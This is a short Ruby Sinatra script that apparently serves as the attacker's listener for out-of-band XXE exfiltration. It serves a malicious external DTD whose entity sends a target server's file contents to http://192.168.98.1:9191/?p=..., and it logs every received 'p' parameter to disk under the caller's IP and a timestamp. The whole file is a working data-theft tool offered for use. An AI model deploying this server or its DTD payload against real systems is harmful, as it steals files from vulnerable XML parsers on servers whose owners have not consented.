#!/usr/bin/env ruby

require 'sinatra'

set :port, ARGV[0] || 443  #set listening port here
set :bind, '0.0.0.0' #so are aren't just listening locally

get "/" do
  return "OHAI" if params[:p].nil?
  f = File.open("./files/#{request.ip}#{Time.now.to_i}","w")
  f.write(params[:p])
  f.close
  ""
end

get "/xml" do
  return "" if params[:f].nil?

<<END  
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.98.1:9191/?p=%file;'>">
%all;
END
end
